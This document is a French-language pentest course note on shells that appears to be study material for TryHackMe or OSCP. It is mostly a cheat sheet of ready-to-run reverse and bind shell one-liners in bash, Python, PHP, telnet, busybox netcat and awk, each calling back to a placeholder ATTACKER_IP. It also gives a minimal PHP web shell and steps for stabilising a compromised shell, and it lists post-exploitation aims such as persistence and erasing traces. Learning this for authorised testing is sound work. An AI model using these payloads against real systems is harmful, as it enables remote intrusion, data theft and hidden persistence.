

# 📘 **Note de Cours – Shells en Cybersécurité**  

## 🔹 1. Qu’est-ce qu’un Shell ?

Un **shell** est une interface permettant d’interagir avec un système d’exploitation via des commandes.  
En cybersécurité offensive, il désigne **une session de commande obtenue sur une machine compromise**.

### Types :
- **Graphical Shell** : interface visuelle (ex: GNOME, Windows Desktop).
- **Command-Line Shell** : terminal textuel (ex: `bash`, `sh`, `cmd.exe`).

> ⚠️ Dans le contexte de l’attaque ou du pentest, "obtenir un shell" = avoir la capacité d’exécuter des commandes à distance sur la cible.

---

## 🔸 2. Objectifs d’un Shell en Post-Exploitation

Une fois un shell obtenu, l’attaquant/pentester peut :
1. **Contrôler la machine à distance**
2. **Élever ses privilèges** (`privilege escalation`)
3. **Exfiltrer des données sensibles**
4. **Installer une persistance** (backdoor, cronjob, compte caché)
5. **Pivoter vers d’autres machines du réseau** (*pivoting*)
6. **Déployer des malwares ou effacer des traces**

---

## 🔹 3. Reverse Shell vs Bind Shell

| Critère | **Reverse Shell** | **Bind Shell** |
|--------|------------------|----------------|
| **Direction** | Cible → Attaquant | Attaquant → Cible |
| **Contournement pare-feu** | ✅ Excellent (trafic sortant souvent autorisé) | ❌ Faible (port entrant souvent bloqué) |
| **Détection** | Plus discret | Moins discret (`netstat` révèle le port) |
| **Cas d’usage** | Environnements filtrés, CTFs, pentests réels | Réseaux internes sans NAT, cible sans sortie internet |

> 💡 **Le reverse shell est la méthode standard en pentest moderne.**

---

## 🔸 4. Reverse Shell – Fonctionnement

### Étapes :
1. **Attaquant** lance un listener :
   ```bash
   rlwrap nc -lvnp 443
   ```
2. **Cible** exécute une payload qui se connecte à l’attaquant:
   ```bash
   rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f
   ```
   - `rm -f /tmp/f` : supprime le fichier pipe `/tmp/f` s'il existe.
   - `mkfifo /tmp/f` : crée un pipe nommé `/tmp/f`. Un fichier pipe est un fichier spécial qui permet de créer un canal de communication entre deux processus.Un processus peut donc y écrire dedans et un autre processus peut y lire.
   - `cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f` : 
      - `cat /tmp/f` : lit le contenu du fichier pipe `/tmp/f`.
      - `/bin/sh -i` : lance un shell interactif.
      - `2>&1` : redirige les flux d'erreur vers le flux standard.
      - `nc ATTACKER_IP 443` : envoie les flux vers l'attaquant.
      - `>/tmp/f` : redirige les flux vers le fichier pipe `/tmp/f`.
      
  Une boucle est ainsi créée (cat lit le pipe, le pipe envoie les flux vers le shell, le shell envoie les flux vers l'attaquant, l'attaquant envoie les flux vers le pipe, le pipe envoie les flux vers le shell, etc.).
3. **Connexion établie** → shell interactif.

### Pourquoi le port 443 ?
- Trafic HTTPS légitime → moins suspect.
- Souvent autorisé en sortie.

---

## 🔹 5. Payloads de Reverse Shell (Linux)

> Remplace toujours `ATTACKER_IP` par ton IP (ex: `ip a show tun0` dans TryHackMe).

### 🐚 Bash (nécessite `/dev/tcp` – fonctionnalité de **bash uniquement**)
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### 🐍 Python (très fiable, donne un TTY avec `pty`)
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### 📜 PHP (idéal pour RCE web)
```php
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

### 🧵 Autres langages/outils
- **Netcat** (si `-e` supporté) :
  ```bash
  nc ATTACKER_IP 443 -e sh
  ```
- **Telnet** :
  ```bash
  TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
  ```
- **AWK** (sur systèmes embarqués) :
  ```awk
  awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(42) { ... }}' /dev/null
  ```

> 💡 Astuce : garde un fichier `~/payloads.txt` dans Exegol avec toutes ces variantes.

---

## 🔸 6. Bind Shell – À utiliser quand le reverse échoue

### Sur la cible :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Depuis l’attaquant :
```bash
nc -nv TARGET_IP 8080
```

> ⚠️ Évite les ports < 1024 (nécessitent root). Préfère 8080, 4444, etc.

---

## 🔹 7. Listeners Avancés (meilleure interaction)

| Outil | Commande | Avantage |
|------|--------|--------|
| **rlwrap + nc** | `rlwrap nc -lvnp 443` | Historique, flèches fonctionnelles |
| **ncat** | `ncat -lvnp 443` | IPv6, SSL, plus stable |
| **ncat (SSL)** | `ncat --ssl -lvnp 443` | Chiffrement (éviter IDS) |
| **socat** | `socat file:\`tty\`,raw,echo=0 tcp-listen:4444` | Vrai TTY interactif |

> 💡 Dans Exegol, tous ces outils sont préinstallés.

---

## 🔸 8. Web Shells – Accès via HTTP

### Définition
Script déposé sur un serveur web, exécutant des commandes via requêtes HTTP.

### Exemple minimal (PHP) :
```php
<?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
```
Appel :
```
http://target.com/shell.php?cmd=id
```

### Web shells avancés :
- **p0wny-shell** : interface terminal-like, légère.
- **b374k** : gestion fichiers, base de données, chiffrement.
- **c99** : scanner de ports, encodeur, backconnect.

> 📂 Chemins courants : `/uploads/`, `/images/`, `/tmp/`

### Utilisation en pentest :
1. Uploader via **File Upload Bypass** ou **LFI**.
2. Appeler via navigateur ou `curl`.
3. Lancer un **reverse shell** depuis le web shell pour un accès complet.

---

## 🔹 9. Stabiliser un Shell (TTY Interactif)

Un shell brut n’est pas utilisable pour `su`, `ssh`, `vim`, etc.  
**Stabilisation classique :**

### Étape 1 : Dans le shell obtenu
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Étape 2 : Dans ton terminal attaquant (Ctrl+Z pour suspendre)
```bash
stty raw -echo ; fg
```

### Étape 3 : Dans le shell
```bash
export TERM=xterm
```

→ Tu as maintenant un **TTY interactif complet**.

> 💡 Si `python3` absent, essaye `script /dev/null -c bash`.

---

## 🔸 10. Bonnes Pratiques & Détection

### Pour les défenseurs :
- Désactiver fonctions dangereuses (`disable_functions` en PHP).
- Restreindre uploads (extension, MIME, analyse).
- Surveiller les logs avec Wazuh, OSSEC.
- Bloquer l’exécution dans `/tmp/`, `/uploads/`.

### Pour les pentesters :
- Toujours utiliser `rlwrap`.
- Préférer les reverse shells sur ports légitimes (80, 443).
- Nettoyer les traces après le test (si autorisé).
- Documenter chaque étape (utile pour rapport OSCP/THM).


### Payloads
### 🔹 **Bash Reverse Shells**

#### 1. **Normal Bash Reverse Shell**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
- `bash -i` : démarre un shell interactif.
- `/dev/tcp/ATTACKER_IP/443` : fonctionnalité intégrée à Bash pour créer une connexion TCP.
- `>&` : redirige **stdout + stderr** vers la connexion.
- `0>&1` : redirige **stdin** vers stdout (donc vers la même connexion).
→ Résultat : un shell interactif complet envoyé à l’attaquant.

#### 2. **Bash Read Line Reverse Shell**
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
- Ouvre le descripteur de fichier **5** vers la connexion TCP.
- Lit chaque ligne reçue (`read line`) et l’exécute (`$line`).
- Renvoie la sortie (et erreurs) via le même descripteur.
→ Moins interactif, mais fonctionne même si `-i` n’est pas disponible.

#### 3. **Bash avec descripteur 196**
```bash
0<&196; exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
- Même principe, mais utilise le descripteur **196** (choisi arbitrairement, souvent pour éviter les conflits).
- Redirige stdin/stdout/stderr via ce descripteur.
→ Très similaire au premier, mais plus explicite sur la gestion des flux.

#### 4. **Bash avec descripteur 5 (variante)**
```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
- Crée un shell interactif (`bash -i`).
- Utilise le descripteur **5** pour la connexion.
- Redirige séparément stdin (0), stdout (1), stderr (2) vers ce descripteur.
→ Version plus lisible et modulaire du reverse shell classique.

---

### 🔹 **PHP Reverse Shells**

Toutes ces variantes créent d’abord une socket TCP avec `fsockopen()`, puis exécutent un shell en redirigeant les flux vers le **descripteur de fichier 3** (car `fsockopen()` retourne une ressource PHP qui devient fd 3 dans le contexte système).

#### Fonctions utilisées :
- `exec()` : exécute une commande, ne renvoie que la dernière ligne (mais ici on redirige tout via `<&3 >&3`).
- `shell_exec()` : exécute et renvoie **toute la sortie**, mais ne gère pas bien les erreurs/stderr sans redirection.
- `system()` : affiche directement la sortie (utile en CLI ou web).
- `passthru()` : idéal pour données binaires (comme `nc` ou outils non-textuels).
- `popen()` : ouvre un processus, mais **ne duplique pas les flux** → cette version est souvent **moins fiable** car elle n’assure pas un shell interactif stable.

⚠️ **Note importante** : toutes ces versions supposent que le descripteur de fichier **3** correspond à la socket. Cela fonctionne dans la plupart des cas, mais ce n’est pas garanti. Une version plus robuste dupliquerait explicitement les descripteurs avec `proc_open()` ou en utilisant `socket_*` + `stream_set_blocking()`.

---

### 🔹 **Python Reverse Shells**

#### Principe commun :
- Créer une socket TCP vers l’attaquant.
- Utiliser `os.dup2()` pour **dupliquer le descripteur de la socket** vers les flux standards (0 = stdin, 1 = stdout, 2 = stderr).
- Lancer un shell avec `pty.spawn("bash")` → fournit un **pseudo-terminal interactif** (meilleure expérience que `subprocess` seul).

##### Variantes :
- **Avec variables d’environnement** : utile si tu veux éviter de hardcoder l’IP/port dans le code (plus discret).
- **Short version** : identique, mais plus compacte.
- **Avec subprocess** : légèrement redondant ici, car `pty.spawn` suffit.

✅ **Pourquoi `pty.spawn` ?**  
Sans `pty`, tu obtiens un shell « dumb » (pas de completion, historique, couleurs…). `pty` émule un vrai terminal.

---

### 🔹 **Autres Reverse Shells**

#### **Telnet**
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
- Crée un **named pipe** (`mkfifo`).
- `telnet` lit depuis le pipe (`0<$TF`), `sh` écrit dedans (`1>$TF`).
→ Les commandes tapées par l’attaquant passent par le pipe → exécutées par `sh`.

> ⚠️ Attention : il manque un espace entre `ATTACKER_IP` et `443` dans ton exemple → ça ne marchera pas sans correction.

#### **AWK**
```awk
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; ... }'
```
- Certains AWK (comme **gawk**) supportent les sockets TCP via `/inet/tcp/...`.
- Boucle infinie qui attend des commandes, les exécute, et renvoie la sortie.
→ Très discret si AWK est disponible mais pas Bash/Python.

#### **BusyBox Netcat**
```bash
busybox nc ATTACKER_IP 443 -e sh
```
- BusyBox inclut souvent une version minimaliste de `nc` (netcat).
- L’option `-e` exécute une commande (`sh`) dès la connexion.
→ Classique, mais **de nombreuses versions de `nc` n’ont pas `-e`** (pour des raisons de sécurité).

---


### 🔗 Ressources
- Web shells : [https://github.com/BlackArch/webshells](https://github.com/BlackArch/webshells)
- Payloads : [https://revshells.com](https://revshells.com) (générateur interactif)
- Cheat sheet : `searchsploit webshell php`


